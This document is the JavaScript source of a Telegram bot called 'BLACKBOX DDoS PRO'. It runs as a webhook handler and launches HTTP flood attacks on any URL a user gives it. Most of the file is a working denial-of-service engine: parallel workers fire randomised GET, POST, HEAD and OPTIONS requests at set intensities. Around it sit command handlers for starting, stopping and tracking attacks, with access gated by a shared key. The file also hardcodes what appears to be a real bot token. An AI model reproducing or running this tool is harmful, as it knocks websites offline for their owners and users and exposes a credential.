import fetch from 'node-fetch'

// ===== CONFIG =====
const BOT_TOKEN = '8202346696:AAG2I28nxL0qGatWEre6IJL_y63yXXeuJMc'
const OWNER_ID = 6629230649
const ACCESS_KEY = '123RJhTtApALhaT'

// ===== STATE =====
const users = new Set([OWNER_ID])
const attacks = new Map()

// ===== ENHANCED ATTACK ENGINE =====
function startEnhancedAttack(target, seconds, chatId, attackId, intensity = 'MEDIUM') {
  let requestCount = 0
  const startTime = Date.now()
  const endTime = startTime + (seconds * 1000)
  
  // Intensity settings
  const settings = {
    'LOW': { workers: 5, interval: 200 },
    'MEDIUM': { workers: 15, interval: 100 },
    'HIGH': { workers: 30, interval: 50 },
    'EXTREME': { workers: 50, interval: 20 }
  }
  
  const config = settings[intensity] || settings.MEDIUM
  
  // Attack methods
  const methods = [
    () => fetch(target, { method: 'GET', signal: AbortSignal.timeout(3000) }),
    () => fetch(target, { 
      method: 'POST', 
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        flood: true,
        timestamp: Date.now(),
        random: Math.random().toString(36).substring(7)
      }),
      signal: AbortSignal.timeout(3000)
    }),
    () => fetch(target, { 
      method: 'HEAD',
      signal: AbortSignal.timeout(3000)
    }),
    () => fetch(target, {
      method: 'OPTIONS',
      signal: AbortSignal.timeout(3000)
    })
  ]
  
  const workers = []
  
  // Create multiple workers
  for (let i = 0; i < config.workers; i++) {
    const worker = setInterval(async () => {
      if (Date.now() > endTime) {
        clearInterval(worker)
        return
      }
      
      // Multi-request per worker
      try {
        const selectedMethod = methods[Math.floor(Math.random() * methods.length)]
        await selectedMethod().catch(() => {})
        requestCount++
        
        // Second request for high intensity
        if (intensity === 'HIGH' || intensity === 'EXTREME') {
          await methods[Math.floor(Math.random() * methods.length)]().catch(() => {})
          requestCount++
        }
      } catch(e) {}
    }, config.interval)
    
    workers.push(worker)
  }
  
  attacks.set(attackId, { 
    workers, 
    chatId, 
    target, 
    startTime,
    intensity,
    requestCount: 0
  })
  
  // Update counter
  const counter = setInterval(() => {
    const attack = attacks.get(attackId)
    if (attack) attack.requestCount = requestCount
  }, 1000)
  
  // Auto stop
  setTimeout(() => {
    const attack = attacks.get(attackId)
    if (attack) {
      attack.workers.forEach(w => clearInterval(w))
      clearInterval(counter)
      attacks.delete(attackId)
      
      const duration = (Date.now() - attack.startTime) / 1000
      const rps = (requestCount / duration).toFixed(1)
      
      sendMessage(chatId,
        `✅ <b>ATTACK COMPLETED</b>\n\n` +
        `ID: <code>${attackId}</code>\n` +
        `Target: ${target}\n` +
        `Duration: ${duration.toFixed(1)}s\n` +
        `Intensity: ${intensity}\n` +
        `Total Requests: ${requestCount}\n` +
        `RPS: ${rps}/s\n` +
        `Workers: ${config.workers}`
      )
    }
  }, seconds * 1000)
}

// ===== HELPER FUNCTIONS =====
async function sendMessage(chatId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: chatId, 
        text: text,
        parse_mode: 'HTML'
      })
    })
  } catch(e) {}
}

// ===== COMMAND HANDLERS =====
async function handleCommand(chatId, text, userId) {
  const isOwner = userId === OWNER_ID
  const isUser = users.has(userId)
  
  if (text === '/start') {
    let response = `⚡ <b>BLACKBOX DDoS PRO</b>\n\n`
    response += `User ID: <code>${userId}</code>\n`
    response += `Status: ${isOwner ? '👑 OWNER' : isUser ? '✅ AUTHORIZED' : '🔒 LOCKED'}\n\n`
    
    response += `<b>MAIN COMMANDS:</b>\n`
    response += `• /menu - Show commands\n`
    response += `• /ping - Test response\n`
    response += `• /methods - Attack methods\n`
    response += `• /intensity - Intensity levels\n`
    
    if (isOwner || isUser) {
      response += `\n<b>ATTACK COMMANDS:</b>\n`
      response += `• /ddos url seconds intensity\n`
      response += `• /stop id\n`
      response += `• /mystats - Your stats\n`
    }
    
    if (!isOwner && !isUser) {
      response += `\n<b>ACCESS KEY:</b>\n<code>${ACCESS_KEY}</code>\n`
      response += `Use: <code>/key ${ACCESS_KEY}</code>`
    }
    
    await sendMessage(chatId, response)
  }
  
  else if (text === '/intensity') {
    await sendMessage(chatId,
      `⚡ <b>ATTACK INTENSITY LEVELS</b>\n\n` +
      `• <b>LOW</b> - 5 workers, 200ms\n` +
      `• <b>MEDIUM</b> - 15 workers, 100ms\n` +
      `• <b>HIGH</b> - 30 workers, 50ms\n` +
      `• <b>EXTREME</b> - 50 workers, 20ms\n\n` +
      `<b>Example:</b>\n` +
      `<code>/ddos https://target.com 60 HIGH</code>\n` +
      `<code>/ddos https://target.com 120 EXTREME</code>`
    )
  }
  
  else if (text.startsWith('/ddos')) {
    if (!isOwner && !isUser) {
      await sendMessage(chatId, '❌ Not authorized\nUse /key first')
      return
    }
    
    const parts = text.split(' ')
    if (parts.length < 3) {
      await sendMessage(chatId, '❌ Format: /ddos url seconds [intensity]\nExample: /ddos https://site.com 60 HIGH')
      return
    }
    
    const url = parts[1]
    const seconds = parseInt(parts[2])
    const intensity = (parts[3] || 'MEDIUM').toUpperCase()
    
    const validIntensity = ['LOW', 'MEDIUM', 'HIGH', 'EXTREME']
    if (!validIntensity.includes(intensity)) {
      await sendMessage(chatId, `❌ Invalid intensity\nUse: ${validIntensity.join(', ')}`)
      return
    }
    
    if (!url.startsWith('http')) {
      await sendMessage(chatId, '❌ Invalid URL\nUse http:// or https://')
      return
    }
    
    if (seconds < 1 || seconds > 3600) {
      await sendMessage(chatId, '❌ Duration: 1-3600 seconds (1 hour max)')
      return
    }
    
    const attackId = Math.random().toString(36).substring(2, 8).toUpperCase()
    
    await sendMessage(chatId,
      `🚀 <b>DDoS LAUNCHED!</b>\n\n` +
      `ID: <code>${attackId}</code>\n` +
      `Target: ${url}\n` +
      `Duration: ${seconds}s\n` +
      `Intensity: ${intensity}\n` +
      `User: <code>${userId}</code>\n\n` +
      `Stop: <code>/stop ${attackId}</code>`
    )
    
    startEnhancedAttack(url, seconds, chatId, attackId, intensity)
  }
  
  else if (text.startsWith('/attack')) {
    // Backward compatibility
    const parts = text.split(' ')
    if (parts.length >= 3) {
      const newText = `/ddos ${parts[1]} ${parts[2]} ${parts[3] || 'MEDIUM'}`
      await handleCommand(chatId, newText, userId)
    }
  }
  
  else if (text.startsWith('/stop')) {
    const attackId = text.split(' ')[1]?.toUpperCase()
    
    if (!attackId) {
      await sendMessage(chatId, '❌ Format: /stop attack_id')
      return
    }
    
    const attack = attacks.get(attackId)
    if (!attack) {
      await sendMessage(chatId, '❌ Attack not found')
      return
    }
    
    if (attack.chatId !== chatId && !isOwner) {
      await sendMessage(chatId, '❌ You can only stop your own attacks')
      return
    }
    
    attack.workers.forEach(w => clearInterval(w))
    attacks.delete(attackId)
    
    const duration = (Date.now() - attack.startTime) / 1000
    await sendMessage(chatId,
      `🛑 <b>ATTACK STOPPED</b>\n\n` +
      `ID: <code>${attackId}</code>\n` +
      `Duration: ${duration.toFixed(1)}s\n` +
      `Target: ${attack.target}\n` +
      `Intensity: ${attack.intensity}`
    )
  }
  
  else if (text === '/mystats') {
    if (!isOwner && !isUser) {
      await sendMessage(chatId, '❌ Not authorized')
      return
    }
    
    const userAttacks = Array.from(attacks.entries())
      .filter(([id, attack]) => attack.chatId === chatId)
    
    let stats = `📊 <b>YOUR STATS</b>\n\n`
    stats += `User ID: <code>${userId}</code>\n`
    stats += `Active Attacks: ${userAttacks.length}\n\n`
    
    if (userAttacks.length > 0) {
      stats += `<b>ACTIVE ATTACKS:</b>\n`
      userAttacks.forEach(([id, attack]) => {
        const duration = ((Date.now() - attack.startTime) / 1000).toFixed(0)
        stats += `• <code>${id}</code>\n`
        stats += `  Target: ${attack.target}\n`
        stats += `  Duration: ${duration}s\n`
        stats += `  Intensity: ${attack.intensity}\n\n`
      })
    }
    
    await sendMessage(chatId, stats)
  }
  
  else if (text.startsWith('/key')) {
    if (isOwner) {
      await sendMessage(chatId, '👑 Owner tidak perlu key')
      return
    }
    
    const key = text.split(' ')[1]
    if (key === ACCESS_KEY) {
      users.add(userId)
      await sendMessage(chatId,
        `✅ <b>ACCESS GRANTED!</b>\n\n` +
        `User ID: <code>${userId}</code>\n` +
        `Status: AUTHORIZED\n\n` +
        `Now you can use:\n` +
        `• /ddos - Enhanced DDoS\n` +
        `• /attack - Legacy attack\n` +
        `• /stop - Stop attacks`
      )
    } else {
      await sendMessage(chatId, '❌ Invalid key')
    }
  }
  
  else if (text === '/methods') {
    await sendMessage(chatId,
      `⚡ <b>ENHANCED DDoS FEATURES</b>\n\n` +
      `• Multi-method attacks (GET, POST, HEAD, OPTIONS)\n` +
      `• Configurable intensity levels\n` +
      `• Multiple concurrent workers\n` +
      `• Auto RPS calculation\n` +
      `• Real-time progress tracking\n\n` +
      `<b>Command:</b>\n` +
      `<code>/ddos [url] [seconds] [intensity]</code>\n\n` +
      `Use /intensity for levels`
    )
  }
  
  else {
    await sendMessage(chatId, '❌ Unknown command\nUse /start for menu')
  }
}

// ===== MAIN HANDLER =====
export default async function handler(req, res) {
  if (req.method === 'GET') {
    const activeAttacks = Array.from(attacks.entries()).map(([id, attack]) => ({
      id,
      target: attack.target,
      intensity: attack.intensity,
      duration: ((Date.now() - attack.startTime) / 1000).toFixed(0)
    }))
    
    return res.json({
      status: 'BLACKBOX PRO ACTIVE',
      owner: OWNER_ID,
      users: users.size,
      attacks: attacks.size,
      active_attacks: activeAttacks,
      uptime: Math.floor(process.uptime())
    })
  }
  
  if (req.method === 'POST') {
    try {
      const update = req.body
      
      if (update.message) {
        const chatId = update.message.chat.id
        const text = update.message.text || ''
        const userId = update.message.from?.id
        
        if (userId) {
          await handleCommand(chatId, text, userId)
        }
      }
      
      return res.json({ ok: true })
    } catch (error) {
      return res.json({ ok: true })
    }
  }
  
  return res.status(405).json({ error: 'Method not allowed' })
      }
